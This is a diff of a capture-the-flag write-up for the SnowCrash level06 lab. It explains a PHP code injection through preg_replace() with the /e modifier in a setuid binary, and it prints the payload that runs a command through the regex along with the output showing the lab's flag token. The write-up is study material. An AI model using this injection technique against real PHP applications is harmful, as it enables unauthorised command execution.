@@ -1,5 +1,16 @@
+We find in our root folder a binary and a php script:
+
 level06@SnowCrash:~$ ls
 level06  level06.php
+
+Both the binary and the php file seem to be the same thing, the plain file is the source code of the compiled one because they behave the same way when executed. In addition to this, we check that the binary has suid permissions set:
+
+level06@SnowCrash:~$ ls -lah level06*
+-rwsr-x---+ 1 flag06 level06 7.4K Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+
+Reading the source code, we notice there is a PHP code injection vulnerability caused by the unsafe use of the preg_replace() with the /e modifier. This vulnerability, deprecated multiple PHP versions ago, allows to interpret the code as PHP upon replacing it within the regex expression, hence, allowing to execute whatever we pass to it
 
 level06@SnowCrash:~$ cat level06.php
 #!/usr/bin/php
@@ -9,13 +20,11 @@ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\]
 $r = x($argv[1], $argv[2]); print $r;
 ?>
 
-level06@SnowCrash:~$ ls -lah level06*
--rwsr-x---+ 1 flag06 level06 7.4K Aug 30  2015 level06
--rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
 
+So, we take advantage of it creating a payload that expoit this vulnerability to get the flag. Notice this payload has brackets and curly braces so we can correctly bypass the regex expression and get to execute the desired command, getflag:
 
-We notice there is a PHP code injection vulnerability caused by the unsafe use of the preg_replace() with the /e modifier.
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/level06
+level06@SnowCrash:~$ ./level06 /tmp/level06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
 
-We create a payload that expoit this vulnerability and get the flag:
-echo '[x ${`getflag`}]' > /tmp/level06
-./level06 /tmp/level06
